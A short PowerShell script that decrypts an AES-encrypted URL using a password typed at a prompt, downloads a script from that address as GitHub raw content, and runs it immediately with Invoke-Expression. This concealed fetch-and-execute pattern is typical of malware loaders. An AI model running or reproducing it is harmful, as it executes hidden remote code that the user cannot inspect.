function Decrypt-String ($Encrypted, $Passphrase, $salt = "Ad3t049866", $init = "Ad3t0PASS") {
	if ($Encrypted -is [string]) {
		$Encrypted = [Convert]::FromBase64String($Encrypted)
	}
	$r = New-Object System.Security.Cryptography.RijndaelManaged
	$pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
	$salt = [Text.Encoding]::UTF8.GetBytes($salt)
	$r.Key = (New-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
	$r.IV = (New-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($init))[0..15]
	$d = $r.CreateDecryptor()
	$ms = New-Object IO.MemoryStream @(, $Encrypted)
	$cs = New-Object Security.Cryptography.CryptoStream $ms, $d, "Read"
	$sr = New-Object IO.StreamReader $cs
	Write-Output $sr.ReadToEnd()
	$sr.Close()
	$cs.Close()
	$ms.Close()
	$r.Clear()
}
$encURL = 'G41VwvESBO+Z8ATsCgJsO/vaPBMEyYDXSIPoQwkpUzvIa/JrfFdQO/H96tiXbQFLAS+h68u9AqYCBF1kBMh7yza8Y927KolwM2120f9hQIbwVgUNEMFqq+fFF+RA/Ql2dMA8hpv5H2qUWA++yRfuHZ08azZy9zQPVO4qoo6YmoZ24R9nTQDY+EWj6UqzFR40zfXNrUfciYgnqMk52LLiOnMoI04MO4HgJluge7zmcJA='
$pass = Read-Host "Password"
$decURL = Decrypt-String -Encrypted $encURL -Passphrase $pass
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Script = Invoke-RestMethod "$($decURL)" -Headers @{"Accept" = "application/vnd.github.v3.raw" }
Invoke-Expression $Script